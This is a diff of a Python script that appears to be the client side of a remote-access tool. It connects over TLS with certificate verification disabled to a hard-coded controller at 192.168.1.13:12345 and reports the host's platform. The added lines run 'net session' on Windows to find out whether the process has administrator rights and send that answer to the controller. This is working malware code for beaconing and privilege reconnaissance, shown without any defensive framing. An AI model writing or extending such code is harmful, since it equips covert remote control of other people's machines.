@@ -7,6 +7,11 @@ import sys
 import paramiko as pa
 import ssl
 import threading as thr
+
+'''5.5.0 v'''
+
+
+
 try:
     
     
@@ -25,15 +30,35 @@ try:
          
         try:
             cont=ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+
             cont.check_hostname=False
+
             cont.verify_mode=ssl.CERT_NONE
+
             with so.create_connection(('192.168.1.13',12345)) as sz:
+
                 with cont.wrap_socket(sz,server_hostname='192.168.1.13') as sst:
+
+                    
                     t=sst.recv(4096).decode('utf-8')
+
                     if t=="connected":
+
                         if pla=='linux' or pla=='win32' or pla=='win64':
+
                             pla=str(pla) 
+
                             sst.sendall(pla.encode('utf-8'))
+
+                            if pla=='win32' or pla=='win64':
+                                
+                                pri=sp.run("net session",shell=True,text=True,capture_output=True)
+                                pri=pri.stdout
+                                if pri == '':
+                                    pri = '0'
+                                elif 'There are no entries in the list.' in pri:
+                                    pri = '1'
+                                sst.sendall(pri.encode('utf-8'))
                             
                         
                         else:   
